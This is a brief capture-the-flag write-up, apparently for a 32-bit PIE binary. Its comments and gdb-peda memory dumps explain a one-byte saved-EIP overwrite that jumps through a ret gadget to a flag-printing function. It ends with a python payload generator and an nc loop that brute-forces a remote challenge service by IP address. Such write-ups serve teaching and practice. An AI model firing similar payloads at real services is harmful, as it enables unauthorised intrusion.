
# Explanation

#
# This program got 2 read.
# it check our input with a password file and if it doesnt match then rip ;(
# if it match it will call the function lisa and give us the flag !
#
# we can overwrite 1 byte of a saved eip address so we will modify it so that the eip
# will go to `ret` instruction then pop our address in the first buffer
# 0x56555802 is the address to the function lisa which will give us the flag
# this binary is PIE but its a 32bit binary so we can bruteforce 

# Saved eip when entered checkPass
# gdb-peda$ x/4x $esp
# 0xffffdc50:	0x56555d22	0x56555802	0x56555802	0x56555802

# Oh its next to our buffer!!!

# Saved eip before ret instruction in checkPass
# gdb-peda$ x/4w $esp
# 0xffffdc50:	0x56555d8c	0x56555802	0x56555802	0x56555802

# 8c lets us go to the ret instruction

# => 0x56555d8c <__libc_csu_init+92>:	ret
#   0x56555d8d:	lea    esi,[esi+0x0]


# => 0x56555d8c <__libc_csu_init+92>:	ret
#   0x56555d8d:	lea    esi,[esi+0x0]
# gdb-peda$ x/4x $esp
# 0xffffdc54:	0x56555802	0x56555802	0x56555802	0x56555802

# gdb-peda$ x/i 0x56555802
#    0x56555802 <lisa>:	push   ebp

python -c 'print("\x56\x55\x58\x02"[::-1]*12 + "\x8c"*43)'  > /tmp/t
while [ 1 ]; do nc 18.191.244.121 12345 -vvv < /tmp/t;done
